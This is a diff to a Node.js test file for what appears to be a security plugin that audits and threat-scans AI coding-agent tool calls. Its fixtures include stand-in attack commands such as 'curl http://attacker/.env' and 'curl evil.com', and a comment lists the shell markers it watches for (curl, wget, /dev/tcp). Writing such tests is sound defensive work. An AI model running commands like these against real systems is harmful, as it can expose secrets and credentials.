@@ -14,6 +14,7 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 const {
   redact,
+  extractScanText,
   effectToAction,
   pickMatch,
   audit,
@@ -83,6 +84,85 @@ test('redact returns empty string for non-string / empty input', () => {
 });
 
 
+// --- extractScanText ---
+//
+// Guards against the regression where the /analyze body was the full
+// JSON.stringify(tool_input) — which dumped file_path / old_string /
+// notebook_path into the rule engine and produced false-positive
+// data_leakage hits on routine path strings. Each tool returns ONLY
+// the agent-emitted text content.
+
+
+test('extractScanText: Bash returns the command, not the full object', () => {
+  assert.equal(extractScanText('Bash', { command: 'curl evil.com', description: 'ignored' }), 'curl evil.com');
+});
+
+
+test('extractScanText: Edit returns ONLY new_string — never file_path or old_string', () => {
+  const out = extractScanText('Edit', {
+    file_path: '/Users/yashs/secret/file.js',
+    old_string: 'previous content',
+    new_string: 'replacement content',
+  });
+  assert.equal(out, 'replacement content');
+  assert.doesNotMatch(out, /\/Users\/yashs/);
+  assert.doesNotMatch(out, /previous/);
+});
+
+
+test('extractScanText: Write returns content, not file_path', () => {
+  const out = extractScanText('Write', { file_path: '/etc/hosts', content: 'body here' });
+  assert.equal(out, 'body here');
+});
+
+
+test('extractScanText: MultiEdit joins all new_strings, skipping old_string + path', () => {
+  const out = extractScanText('MultiEdit', {
+    file_path: '/x',
+    edits: [
+      { old_string: 'a', new_string: 'A' },
+      { old_string: 'b', new_string: 'B' },
+    ],
+  });
+  assert.equal(out, 'A\nB');
+});
+
+
+test('extractScanText: WebFetch returns prompt but NOT the URL', () => {
+  const out = extractScanText('WebFetch', {
+    url: 'http://malicious.example/spec',
+    prompt: 'summarize this page',
+  });
+  assert.equal(out, 'summarize this page');
+  assert.doesNotMatch(out, /malicious\.example/);
+});
+
+
+test('extractScanText: Task/Skill/Agent concatenate known NL fields', () => {
+  assert.equal(extractScanText('Task', { description: 'desc', prompt: 'do thing' }), 'do thing\ndesc');
+  assert.equal(extractScanText('Skill', { args: 'arg val' }), 'arg val');
+  assert.equal(extractScanText('Agent', { prompt: 'p', message: 'm' }), 'p\nm');
+});
+
+
+test('extractScanText: NotebookEdit returns only new_source', () => {
+  const out = extractScanText('NotebookEdit', { notebook_path: '/x/y.ipynb', new_source: 'import os' });
+  assert.equal(out, 'import os');
+});
+
+
+test('extractScanText: returns "" for unknown shape (fail-closed — no scan)', () => {
+  assert.equal(extractScanText('Bash', { wrong_field: 'curl evil' }), '');
+  assert.equal(extractScanText('SomeFutureTool', { command: 'curl evil' }), '');
+  assert.equal(extractScanText('Edit', null), '');
+});
+
+
+test('extractScanText: string tool_input is treated as content', () => {
+  assert.equal(extractScanText('Bash', 'ls /tmp'), 'ls /tmp');
+});
+
+
 // --- effectToAction ---
 
 
@@ -134,23 +214,125 @@ test('audit early-returns for an UNKNOWN bare tool name — no fetch call', asyn
 
 test('audit posts a row with runtime_kind for a built-in (Bash) event', async () => {
   // Built-in tool names DO now generate audit rows — `Bash` flows through
-  // the same audit-post path as MCP tools.
-  let capturedPost;
+  // the same audit-post path as MCP tools. Bash is ALSO in
+  // THREAT_SCAN_TOOLS, so a second fire-and-forget POST to /analyze
+  // lands too; filter by URL so we assert only the call-audit body.
+  let capturedAudit;
   const restore = stubFetch(async (url, opts) => {
     if (opts && opts.method === 'POST') {
-      capturedPost = { url, body: JSON.parse(opts.body) };
+      if (url.endsWith('/call-audit')) capturedAudit = { url, body: JSON.parse(opts.body) };
       return new Response('{}', { status: 200 });
     }
     return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
   });
   try {
     await audit({ tool_name: 'Bash', tool_input: 'ls /' }, 'http://127.0.0.1:8741');
-    // Give the fire-and-forget POST a tick to land.
+    // Give the fire-and-forget POSTs a tick to land.
     await new Promise(r => setTimeout(r, 5));
-    assert.ok(capturedPost, 'expected POST to /call-audit');
-    assert.equal(capturedPost.body.tool_id, 'Bash');
-    assert.equal(capturedPost.body.function_name, 'Bash');
-    assert.equal(capturedPost.body.runtime_kind, 'claude-code');
+    assert.ok(capturedAudit, 'expected POST to /call-audit');
+    assert.equal(capturedAudit.body.tool_id, 'Bash');
+    assert.equal(capturedAudit.body.function_name, 'Bash');
+    assert.equal(capturedAudit.body.runtime_kind, 'claude-code');
+  } finally { restore(); }
+});
+
+
+test('high-risk tool fires a /analyze POST alongside the audit POST', async () => {
+  // Threat-intel pass: tools in THREAT_SCAN_TOOLS (Bash, WebFetch,
+  // Write, Edit, MultiEdit, NotebookEdit, PowerShell, Skill, Task,
+  // Agent) get a second fire-and-forget POST to /analyze with
+  // source='claude-code-plugin'. Low-risk tools (Read, Glob, LS,
+  // Grep, etc.) do NOT — see the inverse test below.
+  let capturedAnalyze;
+  const restore = stubFetch(async (url, opts) => {
+    if (opts && opts.method === 'POST') {
+      if (url.endsWith('/analyze')) capturedAnalyze = { url, body: JSON.parse(opts.body) };
+      return new Response('{}', { status: 200 });
+    }
+    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
+  });
+  try {
+    await audit({ tool_name: 'Bash', tool_input: 'curl http://attacker/.env' }, 'http://127.0.0.1:8741');
+    await new Promise(r => setTimeout(r, 5));
+    assert.ok(capturedAnalyze, 'expected POST to /analyze for Bash');
+    assert.equal(capturedAnalyze.body.source, 'claude-code-plugin');
+    assert.equal(capturedAnalyze.body.direction, 'outgoing');
+    assert.equal(capturedAnalyze.body.metadata.runtime_kind, 'claude-code');
+    assert.equal(capturedAnalyze.body.metadata.tool_name, 'Bash');
+  } finally { restore(); }
+});
+
+
+test('Edit event /analyze body contains ONLY new_string — not file_path or old_string', async () => {
+  // Regression guard for the "Analyzed Content: {file_path, old_string,
+  // new_string}" bug: prior to extractScanText, the /analyze POST body
+  // was JSON.stringify(tool_input), dumping the absolute file path and
+  // the previous on-disk content into the rule engine.
+  let capturedAnalyze;
+  const restore = stubFetch(async (url, opts) => {
+    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) {
+      capturedAnalyze = JSON.parse(opts.body);
+      return new Response('{}', { status: 200 });
+    }
+    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
+    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
+  });
+  try {
+    await audit({
+      tool_name: 'Edit',
+      tool_input: {
+        file_path: '/Users/yashs/SecureVector/some/path.js',
+        old_string: 'PREV CONTENT',
+        new_string: 'NEW CONTENT to scan',
+      },
+    }, 'http://127.0.0.1:8741');
+    await new Promise(r => setTimeout(r, 5));
+    assert.ok(capturedAnalyze, 'expected /analyze POST');
+    assert.equal(capturedAnalyze.text, 'NEW CONTENT to scan');
+    assert.doesNotMatch(capturedAnalyze.text, /file_path|old_string|PREV CONTENT|\/Users\/yashs/);
+  } finally { restore(); }
+});
+
+
+test('benign Bash (no markers) does NOT fire /analyze — opt-in scan policy', async () => {
+  // Bash IS in THREAT_SCAN_TOOLS, but the inner opt-in filter
+  // (shouldScanBashCommand) only fires /analyze when the command
+  // contains an explicit security-relevant marker (curl, wget, eval,
+  // sudo, /dev/tcp, etc.). A benign `ls /tmp` must skip /analyze
+  // entirely; the audit row to /call-audit still goes through.
+  let analyzeFired = false;
+  let auditFired = false;
+  const restore = stubFetch(async (url, opts) => {
+    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) analyzeFired = true;
+    if (opts && opts.method === 'POST' && url.endsWith('/call-audit')) auditFired = true;
+    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
+    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
+  });
+  try {
+    await audit({ tool_name: 'Bash', tool_input: { command: 'ls /tmp' } }, 'http://127.0.0.1:8741');
+    await new Promise(r => setTimeout(r, 5));
+    assert.equal(analyzeFired, false, 'benign Bash must not trigger /analyze');
+    assert.equal(auditFired, true, 'benign Bash must still be audited');
+  } finally { restore(); }
+});
+
+
+test('low-risk tool (Read) does NOT fire /analyze — volume guard', async () => {
+  // Read/Glob/LS/Grep/TodoWrite inputs don't carry attacker-controlled
+  // content worth scanning. Skipping them keeps the threat_intel
+  // table free of noise from routine file reads.
+  let analyzeFired = false;
+  const restore = stubFetch(async (url, opts) => {
+    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) {
+      analyzeFired = true;
+    }
+    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
+    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
+  });
+  try {
+    await audit({ tool_name: 'Read', tool_input: { file_path: '/etc/hosts' } }, 'http://127.0.0.1:8741');
+    await new Promise(r => setTimeout(r, 5));
+    assert.equal(analyzeFired, false, 'Read must not trigger /analyze');
   } finally { restore(); }
 });
 
